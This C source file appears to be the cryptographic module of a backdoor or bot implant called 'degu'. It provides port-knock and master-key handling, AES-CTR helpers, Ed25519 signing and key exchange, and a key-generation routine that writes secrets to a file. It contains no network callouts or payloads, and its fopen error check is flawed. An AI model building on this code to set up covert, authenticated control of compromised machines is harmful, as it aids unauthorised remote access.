#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>


#include "degu.h"
#include "aes.h"
#include "ge.h"
#include "sc.h"
#include "ed25519.h"


unsigned char knock_key[32] = KNOCK_KEY;
unsigned char public_key[32] = MASTER_PUBKEY;
unsigned char bot_public_key[32];
unsigned char bot_private_key[64];



void xcrypt_data(uint8_t *key, unsigned char* data, ssize_t len){
    struct AES_ctx ctx;
    uint8_t iv[16]  = IV;
    AES_init_ctx_iv(&ctx, key, iv);
    AES_CTR_xcrypt_buffer(&ctx, data, len);

}

DEGU_FUNC_EXPORT void xsig(unsigned char* signature, const unsigned char* message, size_t message_len, const unsigned char* private_key){
     ed25519_sign(signature, message,message_len, public_key, private_key);
}

unsigned int xvrfy(const unsigned char* signature, const unsigned char* message, size_t message_len){
    int ret  = ed25519_verify( signature,  message,  message_len, public_key );
    return ret;
}


DEGU_FUNC_EXPORT void xcrypt_knock(unsigned char* data, ssize_t len){
    struct AES_ctx ctx;
    uint8_t iv[16]  = IV;
    AES_init_ctx_iv(&ctx, knock_key, iv);
    AES_CTR_xcrypt_buffer(&ctx, data, len);
}


void setup_keys(void){
    unsigned char seed[32];
    TRACE("generating seed");
    ed25519_create_seed(seed);
    ed25519_create_keypair(bot_public_key, bot_private_key, seed);
}


DEGU_FUNC_EXPORT int xbuf(unsigned char *destkey,unsigned char *privkey, unsigned char *data, size_t len){
    unsigned char seed[32], secret[32]={0};
    ed25519_create_seed(seed);
    ed25519_key_exchange(secret, destkey, privkey);
    xcrypt_data(secret,data,len);
    return 0;
}


DEGU_FUNC_EXPORT void xpub(unsigned char *destkey,unsigned char *privkey){
    ed25519_getpub(destkey,privkey);
}

DEGU_FUNC_EXPORT void keygen(char* path){

    unsigned char  eph_knock[32], eph_public_key[32], eph_private_key[64], eph_seed[32];
    unsigned char  test_public_key[32], test_private_key[64];
    int i = 0;

    ed25519_create_seed(eph_seed);
    ed25519_create_seed(eph_knock);
    ed25519_create_keypair(eph_public_key, eph_private_key, eph_seed);
    ed25519_create_keypair(test_public_key, test_private_key, eph_knock);

    FILE *out = fopen(path,"w");

    if(out < 0)
        return;

    fprintf(out,"pub=\"");
    for(i=0;i<32;i++)
        fprintf(out,"%02x",eph_public_key[i]);
    fprintf(out,"\"\n");
    fprintf(out,"priv=\"");
    for(i=0;i<64;i++)
        fprintf(out,"%02x",eph_private_key[i]);
    fprintf(out,"\"\n");
    fprintf(out,"iv=\"");
    for(int i=0;i<16;i++)
        fprintf(out,"%02x",eph_seed[i]);
    fprintf(out,"\"\n");
    fprintf(out,"knock=\"");
    for(int i=0;i<32;i++)
        fprintf(out,"%02x",eph_knock[i]);
    fprintf(out,"\"\n");

    unsigned char shared_secret[32];
    ed25519_key_exchange(shared_secret, eph_public_key, test_private_key);

    fprintf(out,"secret1=\"");
    for(int i=0;i<32;i++)
        fprintf(out,"%02x",shared_secret[i]);
    fprintf(out,"\"\n");

    unsigned char eph_shared_secret[32];
    ed25519_key_exchange(eph_shared_secret, test_public_key, eph_private_key);

    fprintf(out,"secret2=\"");
    for(int i=0;i<32;i++)
        fprintf(out,"%02x",eph_shared_secret[i]);
    fprintf(out,"\"\n");

    fclose(out);
}
